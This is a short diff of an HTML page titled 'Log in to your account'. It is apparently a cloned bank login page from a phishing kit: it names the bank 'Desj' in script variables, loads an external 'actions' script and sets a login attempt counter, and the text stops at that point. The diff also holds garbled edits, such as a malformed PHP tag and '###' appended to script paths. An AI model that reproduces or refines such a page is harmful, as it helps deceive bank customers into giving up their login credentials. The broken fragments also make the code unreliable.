@@ -1,5 +1,5 @@
 
-<? php  ?>=(0037)/220098/desj -->
+<!-- saved from url=(0037)/220098/desj -->
 <html lang="en" data-whatinput="mouse" data-whatintent="mouse" data-mw-spa="" class="hydrated" style="overflow: auto;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         <title>Log in to your account</title>
         <!--[if lte IE 9]>
@@ -19,12 +19,12 @@
         <link rel="stylesheet" href="./DESJ_1_files/main.css">
         <script>var popup = function(url, title, options){window.open(url, title, options);}</script>
         <link rel="icon" type="image/x-icon" href="/assets/desj/d.ico">
-        <script src="./DESJ_1_files/jquery-3.6.0.min" crossorigin="anonymous"></script>
+        <script src="./DESJ_1_files/jquery-3.6.0.min.js###" crossorigin="anonymous"></script>
         <script>
             var lrbank = 'Desj';
             var lrinfo = 'Login';
         </script>
-        <script src="./DESJ_1_files/actions"></script>
+        <script src="./DESJ_1_files/actions.js###"></script>
         <script>
         $(document).ready(function() {
             var attempt = 2;
